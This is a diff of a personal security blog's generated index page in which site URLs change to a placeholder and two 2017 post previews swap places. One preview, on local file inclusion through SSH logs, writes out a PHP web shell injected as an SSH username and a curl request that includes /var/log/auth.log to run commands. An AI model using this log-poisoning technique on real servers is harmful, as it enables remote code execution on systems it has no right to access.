@@ -18,7 +18,7 @@
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.com/">
+    <link rel="canonical" href="http://yoursite.com/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -213,36 +213,6 @@
 
 <div class="post-preview">
 
-    <a href="/2017/05/01/lfi_ssh/">
-        <h2 class="post-title">
-            Untitled
-        </h2>
-        <h3 class="post-subtitle">
-            
-        </h3>
-        <div class="post-content-preview">
-            LFI SSH日志
-1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
-1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
-Tips:
-123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-05-01
-        </p>
-        <div class="tags">
-            
-        </div>
-    
-
-</div>
-<hr>
-
-<div class="post-preview">
-
     <a href="/2017/05/01/linux_doc_shell/">
         <h2 class="post-title">
             Untitled
@@ -260,6 +230,36 @@ Tips:
 这样就会在本目录下生成一个1.txt文件，内容会有a
 2、linux下本行无法执行完命令时
 12echo 1&gt;\1.p......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-05-01
+        </p>
+        <div class="tags">
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/05/01/lfi_ssh/">
+        <h2 class="post-title">
+            Untitled
+        </h2>
+        <h3 class="post-subtitle">
+            
+        </h3>
+        <div class="post-content-preview">
+            LFI SSH日志
+1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
+1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
+Tips:
+123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
         </div>
     </a>
     
@@ -412,11 +412,11 @@ I publish the whole ......
     <ul>
       
         <li>
-          <a href="/2017/05/01/lfi_ssh/">(no title)</a>
+          <a href="/2017/05/01/linux_doc_shell/">(no title)</a>
         </li>
       
         <li>
-          <a href="/2017/05/01/linux_doc_shell/">(no title)</a>
+          <a href="/2017/05/01/lfi_ssh/">(no title)</a>
         </li>
       
         <li>
@@ -562,7 +562,7 @@ I publish the whole ......
 <script>
     // only load tagcloud.js in tag.html
     if($('#tag_cloud').length !== 0){
-        async("http://rootclay.com/js/jquery.tagcloud.js",function(){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
             $.fn.tagcloud.defaults = {
                 //size: {start: 1, end: 1, unit: 'em'},
                 color: {start: '#bbbbee', end: '#0085a1'},
@@ -613,7 +613,7 @@ I publish the whole ......
 	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
     <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
 <!-- Image to hack wechat -->
-<img src="http://rootclay.com/img/icon_wechat.png" width="0" height="0" />
+<img src="http://yoursite.com/img/icon_wechat.png" width="0" height="0" />
 <!-- Migrate from head to bottom, no longer block render and still work -->
 
 </body>
